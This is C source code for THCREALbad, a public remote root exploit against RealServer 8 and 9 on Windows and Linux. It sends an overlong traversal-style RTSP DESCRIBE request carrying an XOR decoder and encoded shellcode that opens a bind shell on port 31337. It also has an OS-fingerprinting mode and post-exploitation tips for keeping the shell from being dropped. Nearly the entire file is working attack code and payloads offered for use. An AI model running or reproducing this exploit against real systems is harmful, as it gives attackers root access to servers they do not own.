/***************************************************************
/* THCREALbad 0.4 - Wind0wZ & Linux remote root exploit 
/* Exploit by: Johnny Cyberpunk thehackerschoice
/* THC PUBLIC SOURCE MATERIALS 
/*
/* http://www.service.real.com/help/faq/security/rootexploit082203.html
/* 
/* After successful exploitation of a Linux box just type in the following 
/* ps -ef | grep -i rmserver 
/* and then search for the first appearing master pid of rmserver and type 
/* kill -9 <master pid of rmserver> 
/* Otherwise the master process detects that the compromised thread isn't 
/* running in a stable state any longer and kicks u of the box. 
/* On Windows Realservers it doesn't matter, the connection keeps up. 
/* 
/* Also try the testing mode before exploitation of this bug, what OS is 
/* running on the remote site, to know what type of shellcode to use. 
/* 
/* Greetings go to Dave Aitel of Immunitysec who found that bug. 
/* 
/* compile with MS Visual C++ : cl THCREALbad.c 
/***************************************************************
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#define WINDOWS 0
#define LINUX 1
#define OSTESTMODE 2
#pragma comment(lib, "ws2_32.lib")
char ostestmode[] = "OPTIONS / RTSP/1.0\r\n\r\n";
char attackbuffer1[] =
"DESCRIBE /"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../";
char attackbuffer2[] =
".smi RTSP/1.0\r\n\r\n";
char decoder[] =
"\xcc\xcc\x90\x8b\xfd\x83\xc7\x37\x33\xc9\xb2\x90\x66\x81\xc1"
"\x38\x01\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7";
char linuxshell[] =
"\x36\xc5\x55\x6d\xfa\x07\x7f\x6c\x8c\xe2\x55\x6f\x04\x6f\x07"
"\x8c\xe4\xb5\x63\x34\xde\x46\xc8\x85\x6f\x15\x52\x55\x8c\xe4"
"\xb5\x63\x46\xc8\x85\xb5\x63\xb6\x01\x8c\x41\x21\x01\xc8\x85"
"\x36\xc5\x86\xc1\x09\x55\x55\xb5\x63\x46\xc8\x85\x8c\xc6\x34"
"\xcc\xb4\x06\x34\xc5\xb5\x3a\x4c\xc8\x85\x44\xe7\xf3\x34\xc5"
"\x55\x6d\x2a\x2a\x76\x6d\x6d\x2a\x67\x6c\x6b\x8c\xe6\x55\x56"
"\x8c\xe4\x9c\xb5\x0e\xc8\x85";
char w32shell[] =
"\x7b\xb3\xea\xf9\x92\x95\xfc\xc9\x68\x8d\x0c\x4e\x1c\x41\xdc"
"\xe0\x44\x93\x60\xb7\xb0\xb0\xa0\x98\xc7\xc3\xa2\xcf\xa3\xa2"
"\xbe\xd4\xdc\xdc\x91\x7b\x95\x78\x69\x6f\x6f\x6f\xcd\x13\x7d"
"\xba\xfa\xa0\xc9\xf4\x1b\x91\x1b\xd0\x9c\x1b\xe0\x8c\x3d\x1b"
"\xe8\x98\x1d\xcf\xac\x1b\x8b\x91\x6b\x1b\xcb\xe8\x91\x6b\x1b"
"\xdb\x8c\x91\x69\x1b\xc3\xb4\x91\x6a\xc3\xc1\xc2\x1b\xcb\xb0"
"\x91\x6b\xa1\x59\xd1\xa1\x50\x09\x1b\xa4\x1b\x91\x6e\x3c\xa1"
"\x52\x41\x72\x14\x50\xe5\x67\x9f\x26\xd5\x95\x1d\xd4\xd5\x94"
"\xf6\xa9\x80\xe5\x71\xf6\xa1\x80\xca\xc8\xce\xc6\xc0\xc2\xbb"
"\xde\x80\xd1\x9f\x27\x9c\xda\x1b\x94\x18\x91\x68\x9f\x26\xdd"
"\x95\x19\xd4\x1d\x48\x6e\xdd\x95\xe5\x2e\x6e\xdd\x94\xe4\xb1"
"\x6e\xdd\xb2\x1d\xcd\x88\xc3\x6f\x40\x19\x57\xfa\x94\xc8\x18"
"\xd5\x95\x10\xd5\xe7\x9a\x1d\xcd\xe4\x10\xfb\xb6\x84\x79\xe8"
"\x6f\x6f\x6f\x19\x5e\xa1\x4b\xc3\xc3\xc3\xc3\xc6\xd6\xc6\x6f"
"\x40\x07\xc5\xc8\xf6\x19\xa0\xfa\x80\xc5\xc7\x6f\xc5\x44\xde"
"\xc6\xc7\x6f\xc5\x5c\xc3\xc5\xc7\x6f\xc5\x40\x07\x1d\xd5\x18"
"\xc0\x6f\xc5\x74\xc5\xc5\x6f\xc5\x78\x1d\xd4\x95\x9c\x04\xc3"
"\xf8\xbe\xf5\xe8\xf5\xf8\xcc\xf3\xfd\xf4\x04\xa1\x42\x1d\xd5"
"\x5c\x04\xc7\xc7\xc7\xc3\xc3\x6e\x56\x91\x62\xc2\x04\x1d\xd5"
"\xe8\xc0\x1d\xd5\x18\xc0\x21\x98\xc3\xc3\xfa\x80\x6e\x5e\xc2"
"\xc3\xc3\xc3\xc5\x6f\xc5\x7c\xfa\x6f\x6f\xc5\x70";
void usage();
int main(int argc, char *argv[])
{ 
unsigned short realport=554;
unsigned int sock,addr,os,rc;
unsigned char *finalbuffer,*osbuf;
struct sockaddr_in mytcp;
struct hostent * hp;
WSADATA wsaData;
printf("\nTHCREALbad v0.4 - Wind0wZ & Linux remote root sploit for Realservers 8+9\n");
printf("by Johnny Cyberpunk (jcyberpunk@thehackerschoice.com)\n");
if(argc<3 || argc>3)
usage();
finalbuffer = malloc(2000);
memset(finalbuffer,0,2000);
strcpy(finalbuffer,attackbuffer1);
os = (unsigned short)atoi(argv[2]);
switch(os)
{
case WINDOWS:
decoder[11]=0x90;
break;
case LINUX:
decoder[11]=0x05;
break;
case OSTESTMODE:
break;
default:
printf("\nillegal OS value!\n");
exit(-1);
}
strcat(finalbuffer,decoder);
if(os==WINDOWS)
strcat(finalbuffer,w32shell);
else
strcat(finalbuffer,linuxshell);
strcat(finalbuffer,attackbuffer2);
if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0)
{
printf("WSAStartup failed !\n");
exit(-1);
}
hp = gethostbyname(argv[1]);
if (!hp){
addr = inet_addr(argv[1]);
}
if ((!hp) && (addr == INADDR_NONE) )
{
printf("Unable to resolve %s\n",argv[1]);
exit(-1);
}
sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (!sock)
{ 
printf("socket() error...\n");
exit(-1);
}
if (hp != NULL)
memcpy(&(mytcp.sin_addr),hp->h_addr,hp->h_length);
else
mytcp.sin_addr.s_addr = addr;
if (hp)
mytcp.sin_family = hp->h_addrtype;
else
mytcp.sin_family = AF_INET;
mytcp.sin_port=htons(realport);
rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct sockaddr_in));
if(rc==0)
{
if(os==OSTESTMODE)
{
send(sock,ostestmode,sizeof(ostestmode),0);
Sleep(1000);
osbuf = malloc(2000);
memset(osbuf,0,2000);
recv(sock,osbuf,2000,0);
if(*osbuf != '\0')
for(; *osbuf != '\0';)
{
if((isascii(*osbuf) != 0) && (isprint(*osbuf) != 0))
{
if(*osbuf == '\x53' && *(osbuf + 1) == '\x65' && *(osbuf + 2) == '\x72' && *(osbuf + 3) ==
 '\x76' && *(osbuf + 4) == '\x65' && *(osbuf + 5) == '\x72')
{
osbuf += 7;
printf("\nDetected OS: ");
while(*osbuf != '\n')
printf("%c", *osbuf++);
printf("\n");
break;
}
}
osbuf++;
} 
free(osbuf);
}
else
{
send(sock,finalbuffer,2000,0);
printf("\nexploit send .... sleeping a while ....\n");
Sleep(1000);
printf("\nok ... now try to connect to port 31337 via netcat !\n");
}
}
else
printf("can't connect to realserver port!\n");
shutdown(sock,1);
closesocket(sock);
free(finalbuffer);
exit(0);
}
void usage()
{
unsigned int a;
printf("\nUsage: <Host> <OS>\n");
printf("0 = Wind0wZ\n");
printf("1 = Linux\n");
printf("2 = OS Test Mode\n");
exit(0);
}